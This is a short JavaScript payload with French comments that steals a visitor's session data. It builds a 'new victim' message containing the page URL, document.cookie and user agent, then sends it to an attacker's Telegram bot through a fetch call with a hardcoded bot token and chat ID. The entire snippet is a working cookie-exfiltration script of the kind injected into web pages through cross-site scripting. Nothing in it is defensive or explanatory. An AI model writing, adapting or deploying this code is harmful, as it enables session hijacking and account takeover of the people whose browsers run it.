// Configuration
const chat_id = "-4887795296"; // remplace par le tien
const token = "8108131208:AAHjj8T8blfStEhd9mpMd0b0S6Vt9G8mumI"; // remplace par ton token

// Message à envoyer
const msg = `
🔔 Nouvelle victime !
🌐 URL : ${location.href}
🍪 Cookie : ${document.cookie}
🧠 Agent : ${navigator.userAgent}
`;

// Envoi à Telegram
fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
  method: "POST",
  headers: {
    "Content-Type": "application/json"
  },
  body: JSON.stringify({
    chat_id: chat_id,
    text: msg
  })
});
